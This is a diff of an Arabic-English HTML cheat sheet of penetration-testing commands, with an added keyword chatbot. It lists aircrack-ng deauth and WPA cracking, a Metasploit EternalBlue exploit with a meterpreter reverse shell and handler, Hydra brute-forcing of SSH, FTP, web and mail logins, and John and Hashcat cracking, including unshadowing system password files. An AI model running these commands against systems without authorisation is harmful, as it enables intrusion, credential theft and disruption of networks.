-                                <td>فحص الواجهات | Check Interfaces</td>
-                                <td><span class="command-cell">airmon-ng check</span></td>
-                                <td>عرض الواجهات المتاحة وحالتها</td>
-                                <td><button class="copy-btn" onclick="copyCommand('airmon-ng check')">نسخ</button></td>
-                            </tr>
-                            <tr data-search="airmon-ng start monitor mode">
-                                <td>تفعيل وضع المراقبة | Monitor Mode</td>
+                            <tr data-search="airmon monitor mode">
                                 <td><span class="command-cell">sudo airmon-ng start wlan0</span></td>
-                                <td>تفعيل وضع المراقبة على الواجهة</td>
+                                <td>تفعيل وضع المراقبة</td>
                                 <td><button class="copy-btn" onclick="copyCommand('sudo airmon-ng start wlan0')">نسخ</button></td>
                             </tr>
-                            <tr data-search="airodump-ng scan network discover">
-                                <td>مسح الشبكات | Network Scan</td>
+                            <tr data-search="airodump scan">
                                 <td><span class="command-cell">sudo airodump-ng wlan0mon</span></td>
-                                <td>اكتشاف جميع شبكات WiFi القريبة</td>
+                                <td>مسح الشبكات</td>
                                 <td><button class="copy-btn" onclick="copyCommand('sudo airodump-ng wlan0mon')">نسخ</button></td>
-                            </tr>
-                            <tr data-search="airodump-ng capture handshake">
-                                <td>التقاط الـ Handshake | Capture Handshake</td>
-                                <td><span class="command-cell">sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon</span></td>
-                                <td>التقاط Handshake WPA/WPA2</td>
-                                <td><button class="copy-btn" onclick="copyCommand('sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon')">نسخ</button></td>
-                            </tr>
-                            <tr data-search="aireplay-ng deauth deauthentication attack">
-                                <td>هجوم الـ Deauth | Deauth Attack</td>
-                                <td><span class="command-cell">sudo aireplay-ng --deauth 100 -a AA:BB:CC:DD:EE:FF wlan0mon</span></td>
-                                <td>فصل الأجهزة المتصلة بالشبكة</td>
-                                <td><button class="copy-btn" onclick="copyCommand('sudo aireplay-ng --deauth 100 -a AA:BB:CC:DD:EE:FF wlan0mon')">نسخ</button></td>
-                            </tr>
-                            <tr data-search="aircrack-ng crack wpa password">
-                                <td>كسر كلمة المرور | Crack Password</td>
-                                <td><span class="command-cell">sudo aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture*.cap</span></td>
-                                <td>كسر كلمة مرور WPA/WPA2</td>
-                                <td><button class="copy-btn" onclick="copyCommand('sudo aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture*.cap')">نسخ</button></td>
-                            </tr>
-                            <tr data-search="airmon-ng stop disable monitor">
-                                <td>إيقاف وضع المراقبة | Stop Monitor</td>
-                                <td><span class="command-cell">sudo airmon-ng stop wlan0mon</span></td>
-                                <td>إيقاف وضع المراقبة والعودة للحالة الطبيعية</td>
-                                <td><button class="copy-btn" onclick="copyCommand('sudo airmon-ng stop wlan0mon')">نسخ</button></td>
                             </tr>
                         </tbody>
                     </table>
@@ -949,70 +1012,36 @@
             </div>
         </div>
 
-        <!-- ==================== قسم 4: الاستغلال وكسر كلمات المرور ==================== -->
+        <!-- ==================== قسم 4: الاستغلال ==================== -->
         <div class="section" data-section="exploitation">
             <div class="section-header" onclick="toggleSection(this)">
                 <div class="section-title">
                     <span class="section-icon">⚡</span>
-                    استغلال الثغرات وإدارة الجلسات
+                    استغلال الثغرات
                 </div>
                 <button class="toggle-btn">+</button>
             </div>
             <div class="section-content">
-                <!-- Metasploit Framework -->
                 <div class="tool-item" data-tool="metasploit">
-                    <div class="tool-name">🎯 Metasploit Framework - منصة الاستغلال الشاملة</div>
+                    <div class="tool-name">🎯 Metasploit</div>
                     <table>
                         <thead>
                             <tr>
-                                <th>اسم الأمر | Command Name</th>
-                                <th>الأمر البرمجي | Command</th>
-                                <th>الوظيفة | Function</th>
-                                <th>إجراء | Action</th>
+                                <th>الأمر</th>
+                                <th>الوظيفة</th>
+                                <th>إجراء</th>
                             </tr>
                         </thead>
                         <tbody>
-                            <tr data-search="msfconsole metasploit console">
-                                <td>تشغيل Metasploit | Start MSF</td>
+                            <tr data-search="msfconsole">
                                 <td><span class="command-cell">msfconsole</span></td>
-                                <td>تشغيل وحدة التحكم الرئيسية</td>
+                                <td>تشغيل المنصة</td>
                                 <td><button class="copy-btn" onclick="copyCommand('msfconsole')">نسخ</button></td>
                             </tr>
-                            <tr data-search="search exploit module">
-                                <td>البحث عن الاستغلالات | Search Exploit</td>
-                                <td><span class="command-cell">search type:exploit platform:windows</span></td>
-                                <td>البحث عن وحدات الاستغلال المتاحة</td>
-                                <td><button class="copy-btn" onclick="copyCommand('search type:exploit platform:windows')">نسخ</button></td>
-                            </tr>
-                            <tr data-search="use exploit module">
-                                <td>استخدام وحدة | Use Module</td>
+                            <tr data-search="metasploit exploit">
                                 <td><span class="command-cell">use exploit/windows/smb/ms17_010_eternalblue</span></td>
-                                <td>تحديد وحدة استغلال معينة</td>
+                                <td>تحديد استغلال</td>
                                 <td><button class="copy-btn" onclick="copyCommand('use exploit/windows/smb/ms17_010_eternalblue')">نسخ</button></td>
-                            </tr>
-                            <tr data-search="set lhost rhost payload options">
-                                <td>ضبط الخيارات | Set Options</td>
-                                <td><span class="command-cell">set LHOST 192.168.1.100<br>set RHOST 192.168.1.50<br>set PAYLOAD windows/meterpreter/reverse_tcp</span></td>
-                                <td>ضبط خيارات الاستغلال</td>
-                                <td><button class="copy-btn" onclick="copyCommand('set LHOST 192.168.1.100\nset RHOST 192.168.1.50\nset PAYLOAD windows/meterpreter/reverse_tcp')">نسخ</button></td>
-                            </tr>
-                            <tr data-search="exploit run attack">
-                                <td>تشغيل الاستغلال | Run Exploit</td>
-                                <td><span class="command-cell">exploit</span></td>
-                                <td>تنفيذ الاستغلال ضد الهدف</td>
-                                <td><button class="copy-btn" onclick="copyCommand('exploit')">نسخ</button></td>
-                            </tr>
-                            <tr data-search="handler multi listener reverse">
-                                <td>تشغيل Multi-Handler | Start Handler</td>
-                                <td><span class="command-cell">use exploit/multi/handler<br>set PAYLOAD windows/meterpreter/reverse_tcp<br>set LHOST 192.168.1.100<br>exploit -j</span></td>
-                                <td>استقبال الاتصالات العكسية</td>
-                                <td><button class="copy-btn" onclick="copyCommand('use exploit/multi/handler\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST 192.168.1.100\nexploit -j')">نسخ</button></td>
-                            </tr>
-                            <tr data-search="sessions interact meterpreter">
-                                <td>التفاعل مع الجلسة | Interact Session</td>
-                                <td><span class="command-cell">sessions -i 1</span></td>
-                                <td>الاتصال بجلسة meterpreter نشطة</td>
-                                <td><button class="copy-btn" onclick="copyCommand('sessions -i 1')">نسخ</button></td>
                             </tr>
                         </tbody>
                     </table>
@@ -1025,165 +1054,71 @@
             <div class="section-header" onclick="toggleSection(this)">
                 <div class="section-title">
                     <span class="section-icon">🔑</span>
-                    كسر كلمات المرور والتشفير
+                    كسر كلمات المرور
                 </div>
                 <button class="toggle-btn">+</button>
             </div>
             <div class="section-content">
-                <!-- Hydra Tools -->
                 <div class="tool-item" data-tool="hydra">
-                    <div class="tool-name">💧 Hydra - تخمين كلمات المرور عبر الإنترنت</div>
+                    <div class="tool-name">💧 Hydra</div>
                     <table>
                         <thead>
                             <tr>
-                                <th>اسم الأمر | Command Name</th>
-                                <th>الأمر البرمجي | Command</th>
-                                <th>الوظيفة | Function</th>
-                                <th>إجراء | Action</th>
+                                <th>الأمر</th>
+                                <th>الوظيفة</th>
+                                <th>إجراء</th>
                             </tr>
                         </thead>
                         <tbody>
-                            <tr data-search="hydra ssh brute force">
-                                <td>هجوم SSH | SSH Attack</td>
+                            <tr data-search="hydra ssh">
                                 <td><span class="command-cell">hydra -l admin -P wordlist.txt ssh://192.168.1.1</span></td>
-                                <td>تخمين كلمة مرور SSH</td>
+                                <td>هجوم SSH</td>
                                 <td><button class="copy-btn" onclick="copyCommand('hydra -l admin -P wordlist.txt ssh://192.168.1.1')">نسخ</button></td>
                             </tr>
-                            <tr data-search="hydra ftp login">
-                                <td>هجوم FTP | FTP Attack</td>
+                            <tr data-search="hydra ftp">
                                 <td><span class="command-cell">hydra -L users.txt -P wordlist.txt ftp://192.168.1.1</span></td>
-                                <td>تخمين بيانات اعتماد FTP</td>
+                                <td>هجوم FTP</td>
                                 <td><button class="copy-btn" onclick="copyCommand('hydra -L users.txt -P wordlist.txt ftp://192.168.1.1')">نسخ</button></td>
                             </tr>
-                            <tr data-search="hydra http post web form">
-                                <td>هجوم HTTP POST | Web Form</td>
-                                <td><span class="command-cell">hydra -l admin -P wordlist.txt http-post-form://target.com/login:user=^USER^&pass=^PASS^:invalid</span></td>
-                                <td>تخمين كلمة مرور نماذج الويب</td>
-                                <td><button class="copy-btn" onclick="copyCommand('hydra -l admin -P wordlist.txt http-post-form://target.com/login:user=^USER^&pass=^PASS^:invalid')">نسخ</button></td>
-                            </tr>
-                            <tr data-search="hydra mysql database">
-                                <td>هجوم MySQL | MySQL Attack</td>
-                                <td><span class="command-cell">hydra -l root -P wordlist.txt mysql://192.168.1.1</span></td>
-                                <td>تخمين كلمة مرور MySQL</td>
-                                <td><button class="copy-btn" onclick="copyCommand('hydra -l root -P wordlist.txt mysql://192.168.1.1')">نسخ</button></td>
-                            </tr>
-                            <tr data-search="hydra smtp email">
-                                <td>هجوم SMTP | Email Attack</td>
-                                <td><span class="command-cell">hydra -l user@example.com -P wordlist.txt smtp://mail.example.com</span></td>
-                                <td>تخمين كلمة مرور البريد الإلكتروني</td>
-                                <td><button class="copy-btn" onclick="copyCommand('hydra -l user@example.com -P wordlist.txt smtp://mail.example.com')">نسخ</button></td>
-                            </tr>
-                            <tr data-search="hydra threads parallel">
-                                <td>زيادة السرعة | Parallel Tasks</td>
-                                <td><span class="command-cell">hydra -l admin -P wordlist.txt -t 16 ssh://192.168.1.1</span></td>
-                                <td>تسريع الهجوم برفع عدد المحاولات المتزامنة</td>
-                                <td><button class="copy-btn" onclick="copyCommand('hydra -l admin -P wordlist.txt -t 16 ssh://192.168.1.1')">نسخ</button></td>
-                            </tr>
                         </tbody>
                     </table>
                 </div>
 
-                <!-- John the Ripper Tools -->
                 <div class="tool-item" data-tool="john">
-                    <div class="tool-name">🔨 John the Ripper - كسر التجزئة والتشفير</div>
+                    <div class="tool-name">🔨 John the Ripper</div>
                     <table>
                         <thead>
                             <tr>
-                                <th>اسم الأمر | Command Name</th>
-                                <th>الأمر البرمجي | Command</th>
-                                <th>الوظيفة | Function</th>
-                                <th>إجراء | Action</th>
+                                <th>الأمر</th>
+                                <th>الوظيفة</th>
+                                <th>إجراء</th>
                             </tr>
                         </thead>
                         <tbody>
-                            <tr data-search="john hash crack wordlist">
-                                <td>كسر التجزئة | Crack Hash</td>
+                            <tr data-search="john hash">
                                 <td><span class="command-cell">john --wordlist=wordlist.txt hashes.txt</span></td>
-                                <td>كسر كلمات المرور من التجزئة</td>
+                                <td>كسر التجزئة</td>
                                 <td><button class="copy-btn" onclick="copyCommand('john --wordlist=wordlist.txt hashes.txt')">نسخ</button></td>
                             </tr>
-                            <tr data-search="john format md5 sha">
-                                <td>تحديد نوع التجزئة | Hash Format</td>
-                                <td><span class="command-cell">john --format=md5 --wordlist=wordlist.txt hashes.txt</span></td>
-                                <td>كسر تجزئة بصيغة محددة</td>
-                                <td><button class="copy-btn" onclick="copyCommand('john --format=md5 --wordlist=wordlist.txt hashes.txt')">نسخ</button></td>
-                            </tr>
-                            <tr data-search="john incremental brute force">
-                                <td>هجوم بالقوة الغاشمة | Brute Force</td>
-                                <td><span class="command-cell">john --incremental:Lower hashes.txt</span></td>
-                                <td>تجربة جميع التوليفات الممكنة</td>
-                                <td><button class="copy-btn" onclick="copyCommand('john --incremental:Lower hashes.txt')">نسخ</button></td>
-                            </tr>
-                            <tr data-search="john show results password">
-                                <td>عرض النتائج | Show Results</td>
-                                <td><span class="command-cell">john --show hashes.txt</span></td>
-                                <td>عرض كلمات المرور المكتشفة</td>
-                                <td><button class="copy-btn" onclick="copyCommand('john --show hashes.txt')">نسخ</button></td>
-                            </tr>
-                            <tr data-search="john unshadow shadow passwd">
-                                <td>دمج الملفات | Unshadow</td>
-                                <td><span class="command-cell">unshadow passwd shadow > combined.txt<br>john combined.txt</span></td>
-                                <td>دمج ملفات النظام وكسرها</td>
-                                <td><button class="copy-btn" onclick="copyCommand('unshadow passwd shadow > combined.txt\njohn combined.txt')">نسخ</button></td>
-                            </tr>
-                            <tr data-search="john zip password protected archive">
-                                <td>كسر كلمة ZIP | ZIP Crack</td>
-                                <td><span class="command-cell">zip2john archive.zip > hash.txt<br>john --wordlist=wordlist.txt hash.txt</span></td>
-                                <td>كسر كلمة مرور ملف ZIP</td>
-                                <td><button class="copy-btn" onclick="copyCommand('zip2john archive.zip > hash.txt\njohn --wordlist=wordlist.txt hash.txt')">نسخ</button></td>
-                            </tr>
                         </tbody>
                     </table>
                 </div>
 
-                <!-- Hashcat Tools -->
                 <div class="tool-item" data-tool="hashcat">
-                    <div class="tool-name">⚡ Hashcat - كسر التجزئة المعجل بالـ GPU</div>
+                    <div class="tool-name">⚡ Hashcat</div>
                     <table>
                         <thead>
                             <tr>
-                                <th>اسم الأمر | Command Name</th>
-                                <th>الأمر البرمجي | Command</th>
-                                <th>الوظيفة | Function</th>
-                                <th>إجراء | Action</th>
+                                <th>الأمر</th>
+                                <th>الوظيفة</th>
+                                <th>إجراء</th>
                             </tr>
                         </thead>
                         <tbody>
-                            <tr data-search="hashcat basic wordlist attack">
-                                <td>هجوم قاموس | Dictionary Attack</td>
+                            <tr data-search="hashcat md5">
                                 <td><span class="command-cell">hashcat -m 0 -a 0 hashes.txt wordlist.txt</span></td>
-                                <td>كسر MD5 باستخدام قائمة كلمات</td>
+                                <td>كسر MD5</td>
                                 <td><button class="copy-btn" onclick="copyCommand('hashcat -m 0 -a 0 hashes.txt wordlist.txt')">نسخ</button></td>
-                            </tr>
-                            <tr data-search="hashcat brute force mask">
-                                <td>هجوم بالقناع | Mask Attack</td>
-                                <td><span class="command-cell">hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a?a?a</span></td>
-                                <td>تجربة كل التوليفات برقم وحروف محددة</td>
-                                <td><button class="copy-btn" onclick="copyCommand('hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a?a?a')">نسخ</button></td>
-                            </tr>
-                            <tr data-search="hashcat rule based">
-                                <td>هجوم القواعد | Rule-Based Attack</td>
-                                <td><span class="command-cell">hashcat -m 0 -a 0 -r rules.txt hashes.txt wordlist.txt</span></td>
-                                <td>تطبيق قواعد على قائمة الكلمات</td>
-                                <td><button class="copy-btn" onclick="copyCommand('hashcat -m 0 -a 0 -r rules.txt hashes.txt wordlist.txt')">نسخ</button></td>
-                            </tr>
-                            <tr data-search="hashcat show results found">
-                                <td>عرض النتائج | Show Results</td>
-                                <td><span class="command-cell">hashcat -m 0 -a 0 hashes.txt wordlist.txt --show</span></td>
-                                <td>عرض كلمات المرور المكتشفة</td>
-                                <td><button class="copy-btn" onclick="copyCommand('hashcat -m 0 -a 0 hashes.txt wordlist.txt --show')">نسخ</button></td>
-                            </tr>
-                            <tr data-search="hashcat sha256 hash type">
-                                <td>كسر SHA-256 | SHA-256 Crack</td>
-                                <td><span class="command-cell">hashcat -m 1400 -a 0 hashes.txt wordlist.txt</span></td>
-                                <td>كسر تجزئة SHA-256</td>
-                                <td><button class="copy-btn" onclick="copyCommand('hashcat -m 1400 -a 0 hashes.txt wordlist.txt')">نسخ</button></td>
-                            </tr>
-                            <tr data-search="hashcat benchmark speed">
-                                <td>اختبار السرعة | Benchmark</td>
-                                <td><span class="command-cell">hashcat -m 0 -b</span></td>
-                                <td>اختبار سرعة كسر التجزئة</td>
-                                <td><button class="copy-btn" onclick="copyCommand('hashcat -m 0 -b')">نسخ</button></td>
                             </tr>
                         </tbody>
                     </table>
@@ -1194,12 +1129,12 @@
         <!-- Footer -->
         <div style="margin-top: 60px; padding: 30px; border-top: 2px solid var(--neon-green); text-align: center; color: var(--neon-blue);">
             <p style="margin-bottom: 10px;">⚠️ تنبيه أمني | Security Notice</p>
-            <p style="font-size: 13px; color: var(--text-secondary);">هذه الأدوات يجب استخدامها فقط لأغراض تعليمية والاختبار الأخلاقي على الأنظمة التي تملكها أو لديك إذن صريح منها | These tools should only be used for educational purposes and ethical testing on systems you own or have explicit permission to test.</p>
+            <p style="font-size: 13px; color: var(--text-secondary);">استخدام هذه الأدوات يجب أن يكون لأغراض تعليمية وأخلاقية فقط | Use these tools for educational and ethical purposes only</p>
         </div>
     </main>
 
     <script>
-        // Search and Filter Functionality
+        // ==================== البحث والتصفية ====================
         const searchInput = document.getElementById('searchInput');
         const sections = document.querySelectorAll('.section');
         const noResults = document.getElementById('noResults');
@@ -1209,6 +1144,11 @@
             let hasResults = false;
 
             sections.forEach(section => {
+                if (section.getAttribute('data-section') === 'code-analyzer' || 
+                    section.getAttribute('data-section') === 'chatbot') {
+                    return;
+                }
+
                 const tools = section.querySelectorAll('.tool-item');
                 let sectionHasResults = false;
 
@@ -1250,7 +1190,7 @@
             noResults.style.display = hasResults ? 'none' : 'block';
         });
 
-        // Toggle Section Function
+        // ==================== توسيع/إغلاق الأقسام ====================
         function toggleSection(header) {
             const content = header.nextElementSibling;
             const btn = header.querySelector('.toggle-btn');
@@ -1259,7 +1199,7 @@
             btn.textContent = content.classList.contains('active') ? '−' : '+';
         }
 
-        // Copy to Clipboard Function
+        // ==================== نسخ الأوامر ====================
         function copyCommand(text) {
             navigator.clipboard.writeText(text).then(() => {
                 event.target.textContent = '✓ تم النسخ!';
@@ -1270,17 +1210,16 @@
                     event.target.classList.remove('copied');
                 }, 2000);
             }).catch(err => {
-                alert('حدث خطأ في النسخ');
+                alert('خطأ في النسخ');
             });
         }
 
-        // Scroll to Section Function
+        // ==================== الانتقال إلى القسم ====================
         function scrollToSection(sectionId) {
             const section = document.querySelector(`[data-section="${sectionId}"]`);
             if (section) {
                 section.scrollIntoView({ behavior: 'smooth', block: 'start' });
                 
-                // Open the section if closed
                 const header = section.querySelector('.section-header');
                 const content = section.querySelector('.section-content');
                 if (!content.classList.contains('active')) {
@@ -1289,18 +1228,134 @@
             }
         }
 
-        // Initialize - Open first section by default
+        // ==================== محلل الأكواد ====================
+        const codeToolsDatabase = {
+            'nmap': { name: 'Nmap', desc: 'فحص الشبكات' },
+            'hydra': { name: 'Hydra', desc: 'تخمين كلمات المرور' },
+            'sqlmap': { name: 'SQLmap', desc: 'حقن قاعدة البيانات' },
+            'metasploit': { name: 'Metasploit', desc: 'استغلال الثغرات' },
+            'aircrack': { name: 'Aircrack-ng', desc: 'اختبار لاسلكي' },
+            'python': { name: 'Python', desc: 'لغة برمجة' },
+            'bash': { name: 'Bash', desc: 'شل لينكس' },
+            'ssh': { name: 'SSH', desc: 'وصول آمن' }
+        };
+
+        function analyzeCode() {
+            const code = document.getElementById('codeInput').value.trim();
+            const output = document.getElementById('analysisOutput');
+
+            if (!code) {
+                output.innerHTML = '<p style="color: var(--text-secondary);">أدخل كود</p>';
+                return;
+            }
+
+            let detectedTools = [];
+            let codeType = 'غير معروف';
+
+            for (let tool in codeToolsDatabase) {
+                if (code.toLowerCase().includes(tool)) {
+                    detectedTools.push(codeToolsDatabase[tool]);
+                }
+            }
+
+            if (code.includes('python') || code.includes('def ')) {
+                codeType = 'Python Script';
+            } else if (code.includes('bash') || code.includes('#!/bin/')) {
+                codeType = 'Bash Script';
+            } else if (code.includes('function') || code.includes('const ')) {
+                codeType = 'JavaScript';
+            }
+
+            let html = `<div class="analysis-result"><h4>📝 نوع الكود</h4><p>${codeType}</p></div>`;
+
+            if (detectedTools.length > 0) {
+                html += `<div class="analysis-result"><h4>🔧 الأدوات</h4><div>`;
+                detectedTools.forEach(tool => {
+                    html += `<span class="tool-badge">${tool.name} - ${tool.desc}</span>`;
+                });
+                html += `</div></div>`;
+            }
+
+            let stats = `عدد الأسطر: ${code.split('\n').length}<br>عدد الأحرف: ${code.length}`;
+            html += `<div class="analysis-result"><h4>📊 إحصائيات</h4><p>${stats}</p></div>`;
+
+            output.innerHTML = html;
+        }
+
+        function clearCodeAnalyzer() {
+            document.getElementById('codeInput').value = '';
+            document.getElementById('analysisOutput').innerHTML = '<p style="color: var(--text-secondary);">أدخل كود</p>';
+        }
+
+        // ==================== Chatbot ====================
+        const botResponses = {
+            'nmap': { keywords: ['nmap', 'فحص', 'scan'], response: '🎯 Nmap:\nnmap 192.168.1.1 - فحص\nnmap -O 192.168.1.1 - كشف OS\nnmap --script vuln - فحص ثغرات' },
+            'wifi': { keywords: ['wifi', 'aircrack', 'لاسلكي'], response: '📡 اختبار لاسلكي:\nsudo airmon-ng start wlan0\nsudo airodump-ng wlan0mon\nsudo aircrack-ng -w wordlist.txt' },
+            'sql': { keywords: ['sql', 'sqlmap', 'حقن'], response: '💉 SQLmap:\nsqlmap -u "http://target.com/page?id=1"\nsqlmap -u "http://target.com/page?id=1" --dump' },
+            'metasploit': { keywords: ['metasploit', 'exploit'], response: '🎯 Metasploit:\nmsfconsole\nuse exploit/...\nset LHOST 192.168.1.100\nexploit' },
+            'hydra': { keywords: ['hydra', 'password', 'كلمة مرور'], response: '💧 Hydra:\nhydra -l admin -P wordlist.txt ssh://192.168.1.1\nhydra -L users.txt -P pass.txt ftp://192.168.1.1' },
+            'help': { keywords: ['help', 'أساعدك'], response: '👋 يمكنني مساعدتك مع:\n✅ Nmap, Hydra, SQLmap\n✅ Metasploit, Aircrack\n✅ أوامر Linux\n\nاسأل عن أي أداة!' }
+        };
+
+        function sendChatMessage() {
+            const input = document.getElementById('chatInput');
+            const message = input.value.trim();
+
+            if (!message) return;
+
+            addChatMessage(message, 'user');
+            input.value = '';
+
+            setTimeout(() => {
+                const reply = generateBotReply(message);
+                addChatMessage(reply, 'bot');
+            }, 500);
+        }
+
+        function addChatMessage(text, sender) {
+            const messagesDiv = document.getElementById('chatMessages');
+            const messageEl = document.createElement('div');
+            messageEl.className = `chat-message message-${sender}`;
+            messageEl.innerHTML = `<div class="message-content">${escapeHtml(text)}</div>`;
+            messagesDiv.appendChild(messageEl);
+            messagesDiv.scrollTop = messagesDiv.scrollHeight;
+        }
+
+        function generateBotReply(userMessage) {
+            const lowerMessage = userMessage.toLowerCase();
+
+            for (let key in botResponses) {
+                const bot = botResponses[key];
+                for (let keyword of bot.keywords) {
+                    if (lowerMessage.includes(keyword)) {
+                        return bot.response;
+                    }
+                }
+            }
+
+            return '🤖 سؤال رائع! اسأل عن Nmap, Hydra, SQLmap أو Metasploit\n\nاكتب "help" للمزيد';
+        }
+
+        function escapeHtml(text) {
+            const map = {
+                '&': '&amp;',
+                '<': '&lt;',
+                '>': '&gt;',
+                '"': '&quot;',
+                "'": '&#039;'
+            };
+            return text.replace(/[&<>"']/g, m => map[m]);
+        }
+
+        // ==================== التهيئة ====================
         window.addEventListener('load', () => {
-            const firstSection = document.querySelector('.section-content');
-            if (firstSection) {
-                firstSection.classList.add('active');
+            const firstSection = document.querySelector('[data-section="code-analyzer"] .section-content');
+            if (firstSection && firstSection.classList.contains('active')) {
                 firstSection.previousElementSibling.querySelector('.toggle-btn').textContent = '−';
             }
         });
 
-        // Add Keyboard Shortcuts
         document.addEventListener('keydown', (e) => {
-            // Ctrl/Cmd + K to focus search
             if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
                 e.preventDefault();
                 searchInput.focus();
